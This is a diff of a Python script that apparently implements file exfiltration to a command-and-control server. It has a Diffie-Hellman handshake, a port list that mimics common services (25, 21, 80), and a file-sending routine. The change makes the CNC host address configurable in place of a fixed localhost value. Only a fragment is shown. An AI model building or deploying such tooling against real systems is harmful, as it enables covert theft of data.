@@ -56,7 +56,7 @@ class Communication(Thread):
         print("[+] Connected.")
         return s
 
-###################################
+
 class TCP_Listener:
     ip = "0.0.0.0"
     port = 81
@@ -92,20 +92,20 @@ class TCP_Listener:
         s.bind((ip, port))
         return s
 
-###################################
+
 
 class Sender:
-    def __init__(self):
+    def __init__(self, IP):
         self.dh = pyDH.DiffieHellman()
         self.dh_pubkey = self.dh.gen_public_key()
-        self.CNC = "127.0.0.1"
+        self.CNC = IP
         self.CNC_regular_port = 444
         self.PORTLIST = [25,21,80]
         self.RECEIVER_DH_PUB_KEY = None
 
         self.send_msg(1, self.dh_pubkey.to_bytes(256, 'big'))
         
-        ###########################################
+        
 
         msg_type, result = TCP_Listener.get_next_message()
         if msg_type == 1:
@@ -116,7 +116,7 @@ class Sender:
         print(self.dh_sharedkey)
         time.sleep(0.1)
 
-        ###########################################
+        
 
 
     def send_msg(self, msg_type, msg, ip=None, port=None):
@@ -149,7 +149,7 @@ class Sender:
             port = self.CNC_regular_port
 
         msg = {}
-        msg["filename"] = os.path.relpath(filename)
+        msg["filename"] = os.path.basename(filename)
         msg["filesize"] = size
 
         msg = json.dumps(msg)
@@ -221,13 +221,11 @@ class Sender:
 
 
 def main():
-    sender = Sender()
-    filename = "test.file"
-    
-    sender.send_file(filename)
+    sender = Sender("127.0.0.1")
+    # sender.send_file("test.file")
     sender.send_file("test.dat")
     sender.send_file("arch.jpg")
-    
+
 
 if __name__ == "__main__":
     main()
